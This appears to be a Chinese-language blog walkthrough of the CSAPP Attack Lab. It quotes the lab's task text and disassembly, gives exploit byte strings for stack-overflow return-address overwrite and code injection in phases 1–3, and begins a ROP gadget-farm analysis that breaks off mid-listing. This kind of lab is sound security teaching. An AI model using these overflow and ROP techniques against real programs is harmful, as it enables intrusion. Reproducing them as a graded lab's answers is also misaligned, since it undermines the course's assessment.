class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.</span></span><br><span class="line"><span class="string">    Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.</p><p>这个题目非常简单, 不需要注入攻击, 只需要利用 getbuf()将程序的控制权从test函数,转入到touch1函数即可.</p><p>利用<code>objdump -d</code>命令,反汇编ctarget看看:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  40196c:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401971:e8 32 fe ff ff       callq  4017a8 &lt;getbuf&gt;</span><br><span class="line">  401976:89 c2                mov    %eax,%edx</span><br><span class="line">  401978:be 88 31 40 00       mov    $0x403188,%esi</span><br><span class="line">  40197d:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  401982:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401987:e8 64w f4 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  401990:c3                   retq   </span><br><span class="line">  401991:90                   nop</span><br><span class="line">  401992:90                   nop</span><br><span class="line">  401993:90                   nop</span><br><span class="line">  401994:90                   nop</span><br><span class="line">  401995:90                   nop</span><br><span class="line">  401996:90                   nop</span><br><span class="line">  401997:90                   nop</span><br><span class="line">  401998:90                   nop</span><br><span class="line">  401999:90                   nop</span><br><span class="line">  40199a:90                   nop</span><br><span class="line">  40199b:90                   nop</span><br><span class="line">  40199c:90                   nop</span><br><span class="line">  40199d:90                   nop</span><br><span class="line">  40199e:90                   nop</span><br><span class="line">  40199f:90                   nop</span><br><span class="line"></span><br><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   retq   </span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br><span class="line"></span><br><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017c4:c7 05 0e 2d 20 00 01 movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:00 00 00 </span><br><span class="line">  4017ce:bf c5 30 40 00       mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:e8 e8 f4 ff ff       callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  4017dd:e8 ab 04 00 00       callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  4017e7:e8 54 f6 ff ff       callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>我将三个涉及到的东西提取了出来. 主要看getbuf和touch1函数.</p><p>对于getbuf来说, 我们看到汇编的第一句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub $0x28,%rsp</span><br></pre></td></tr></table></figure><p>也就是说, getbuf首先开辟了0x28的stack空间.</p><p>对于touch1来说,我们知道它的地址是:0x4017c0. </p><p>好的,知道这两点,我们就可以写攻击代码了, 在写之前, 先画个示意图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720231159598.png" alt="image-20200720231159598"></p><p>说明:</p><ol><li>单元格中存放的是起始起始,一个内存单元8个字节</li><li>buffer由低到高写入</li></ol><p>关键点是要 <strong>覆盖test 401976</strong>这个单元, 正常情况下,这里存放这从getbuf返回后,test函数中getbuf的下一行汇编指令. 要从test中抢夺函数控制权, 就需要覆盖这里. 那覆盖成什么样? 当然就是我们 touch1函数的首地址了, 另外需要注意机器的字节序(这里是小端序). 综上, 攻击代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question1: 填充40个字节后加入touch1的返回地址(小端序) *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">c0 17 40 00 00 00 00 00 &#x2F;* touch1 address *&#x2F;</span><br></pre></td></tr></table></figure><p>40 = 0x28</p><blockquote><p>请注意, 之所以可以做,因为ctarget在汇编时关闭了 <strong>stack随机和注入代码不可执行</strong> 两个常用的阻止注入攻击的方法, 否则这个题就目前的知识来说是无解的.</p></blockquote><h2 id="2-Phase-2"><a href="#2-Phase-2" class="headerlink" title="2. Phase 2"></a>2. Phase 2</h2><p>题目:</p><p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function touch2 having the following C representation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">     <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.</p><p>题目的意思很简单, 接着题目1, 现在要跳转的函数是touch2, 只不过touch2需要一个参数val, val是cookie的值. 这里就要用到注入了, 如何生成注入代码,请参照 attack lab的write up的Appendix B.</p><p>说明:cookie在lab文件中有, 我这里它是 0x59b997fa.</p><p>关键点:</p><ol><li>cookie值</li><li>rdi寄存器保存函数的第一个参数.</li></ol><p>思路简单:</p><ol><li>设置rdi = cookie value</li><li>跳转到touch2即可.</li></ol><p>但是这里存在两个跳转, 1.跳转我们的注入代码的首地址.2.跳转到touch2. 画个图看看:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720232843852.png" alt="image-20200720232843852"></p><p>也就是说,我们首先应该跳转到我们注入的代码的首地址, 然后注入代码执行过程中(红色的区域的某个部分),又跳转到touch2. </p><p>跳转1很直观, 我们覆盖了原来的地址, 那跳转2如何实现?</p><p>这个就要理解清除call和ret指令的工作了, 简单说来:</p><ol><li>call, %rsp-1, push当前执行指令的指令到%rsp所指的内存空间, 设置%rip为要跳转的函数的第一条指令地址.</li><li>ret, pop %rsp指向的内存空间的内容到 %rip, %rsp+1.</li></ol><p>于是要实现跳转2, 我们只用push touch2的第一条指令的地址到$%rsp, %rsp-1即可. 其实也就一条命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push touch2_address</span><br></pre></td></tr></table></figure><p>至于设置%rdi=cooike, 那就很直接了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov cookie_value, %rdi</span><br></pre></td></tr></table></figure><p>结合两条指令, 写出汇编代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov cookie_value, %rdi</span><br><span class="line">push touch2_address</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>更换为实际value, 并用objdump反汇编,最终可得答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question2: *&#x2F;</span><br><span class="line">48 c7 c7 fa 97 b9 59 &#x2F;* mov $0x59b997fa      %rdi 设置cooike *&#x2F;</span><br><span class="line">68 ec 17 40 00       &#x2F;* pushq  $0x4017ec     push touch2的地址 *&#x2F;</span><br><span class="line">c3                   &#x2F;* ret                  返回 *&#x2F;</span><br><span class="line">&#x2F;* 上面一共13个字节, buf一共40个字节所以需要填充 40-13&#x3D;27个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00                &#x2F;* 3 bytes *&#x2F;</span><br><span class="line">78 dc 61 55 00 00 00 00 &#x2F;* exploit string code 的开始地址（即get buf的栈地地址) *&#x2F;</span><br></pre></td></tr></table></figure><p>一点题外话:</p><blockquote><p>这个题思路很简单,但是我却做了差不多3个小时. 原因在于, 我对每个指令都补齐成了8个字节(也不知道脑袋怎么想的). 搞了1,2个小时 , gdb调试出来的指令和我写入的指令就是不同, 无奈取网上查答案, 发现思路是对的, 别人的代码却和我的不同, 要不就是 题目都和我不一样. 最后认真看了一个帖子才找到自己的问题. </p><p>比如我将 c3指令,编码成了 c3 00 00 00 00 00 00 00 . 所以在运行时, 总是不对.</p></blockquote><h2 id="3-Phase-3"><a href="#3-Phase-3" class="headerlink" title="3. Phase 3"></a>3. Phase 3</h2><p>题目:</p><p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">     <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">     <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">     <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     vlevel = <span class="number">3</span>;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Part of validation protocol */</span></span><br><span class="line">     <span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Touch3!:</span></span><br><span class="line"><span class="string">         You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">         validate(<span class="number">3</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Misfire:</span></span><br><span class="line"><span class="string">         You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">         fail(<span class="number">3</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.</p><p>这个题目的几个关键点:</p><ol><li>cooike的 string ascii码表示</li><li>cooike的string ascii码的存放以及 <strong>存放位置的确定</strong></li><li>rdi指向 string 的存放地址.</li><li>touch3跳转</li></ol><p>cooike的ascii码很简单, 对照ascii码表即可得:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* 9 bytes *&#x2F; </span><br></pre></td></tr></table></figure><p>唯一值得注意的是, 要在末尾添加\0表示c 字符串的结束.</p><p>难点在于确定位置: 说说我做的时候遇到的问题:</p><p>之所以难以确定字符串存放的位置, 是因为后续的hexmatch和stringncmp函数会覆盖buf的stack空间.</p><ul><li><p>我最初想的是, 将字符串存放在一个相对很低的位置, 让后续的两个函数不会产生覆盖. 但是这样的问题是, cooike string无法进行硬编码. 毕竟没有指令可以直接写字符串到内存中, 倒是可以一个个字符的写入, 但是这样我们的exploit string会过长, 于是这个方法废弃了.</p></li><li><p>说第二想法之前, 我们先看看后续的程序会对stack空间做些什么:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090502836.png" alt="image-20200721090502836"></p><p>那字符串到底放在哪里? 我尝试了将字符串放在了buf的stack顶端和低端, 如下两图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090628772.png" alt="image-20200721090628772"></p><p>经过gdb调试,两者都会被覆盖, 所以这个方案也被pass掉了.</p><p>继续思考, 放在内存的低端的确很容易被覆盖,因为hexmatch函数中有个随机从某个位置开始写入cbuf的操作, 所以低端是没法用的. 只能考虑高端, 高端是由 push压入regs导致的覆盖, 只要避免了这个就好了. 回忆以下push指令是如何工作的, </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push reg</span><br></pre></td></tr></table></figure><p>reg被压入%rsp当前指向的内存空间, 然后%rsp-1</p><p>所以我们可以直接继续覆盖, 看示意图:</p></li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p><p>可以得到注入代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question3: *&#x2F;</span><br><span class="line">48 c7 c7 a8 dc 61 55 &#x2F;* mov $0x5561dca8,%rdi 设置$rdi指向string内存地址 *&#x2F;</span><br><span class="line">68 fa 18 40 00       &#x2F;* pushq  $0x4018fa     push touch3的地址 *&#x2F;</span><br><span class="line">c3                   &#x2F;* ret                  返回 *&#x2F;</span><br><span class="line">&#x2F;* 上面一共13个字节, buf一共40个字节所以需要填充 40-13&#x3D;27个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00                &#x2F;* 3 bytes *&#x2F;</span><br><span class="line">78 dc 61 55 00 00 00 00 &#x2F;* exploit string code 的开始地址（即get buf的栈地地址) *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* 继续覆盖为cookie string *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-Phase-4"><a href="#4-Phase-4" class="headerlink" title="4. Phase 4"></a>4. Phase 4</h2><p>从这个阶段开始, 就是aop攻击的内容了. 所以在继续之前, 一定要知道rop攻击的理论基础. </p><p>rop的背景是 在stack随机和注入不可能执行 等防止注入攻击手段下, 我们可以寻找text section中有效的代码片段, 这些片段通常都是以ret结尾, 找到这些指令后(一个这样的片段被称为一个gaddget), 通过stack frame入栈出栈原理,将这些gaddget串成一条链, 从而能够组成有用的攻击代码.</p><p>本题的背景是开启了 stack随机化和注入注入代码不可执行 两个功能的.</p><p>好,现在来看看phase4题目:</p><p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).<br>movq : The codes for these are shown in Figure 3A.<br>popq : The codes for these are shown in Figure 3B.<br>ret : This instruction is encoded by the single byte 0xc3.<br>nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single<br>byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093742135.png" alt="image-20200721093742135"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093753166.png" alt="image-20200721093753166"></p><p>所有可用指令, 我都高亮了.</p><p>注意点:</p><p>题目中提到的gadget farm是指在rtaget反汇编后, 我们的gaddget只能从start_farm段到end_farm段之间的所有指令中抽取. 这之间的指令为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401999:c3                   retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:b8 fb 78 90 90       mov    $0x909078fb,%eax</span><br><span class="line">  40199f:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:c7 07 48 89 c7 c7    movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:c7 07 54 c2 58 92    movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:c7 07 63 48 8d c7    movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4019d5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:c7 07 99 d1 90 90    movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:8d 87 89 ce 78 c9    lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:8d 87 8d d1 20 db    lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:b8 89 d1 48 c0       mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:c7 07 81 d1 84 c0    movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:c7 07 88 c2 08 c9    movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span 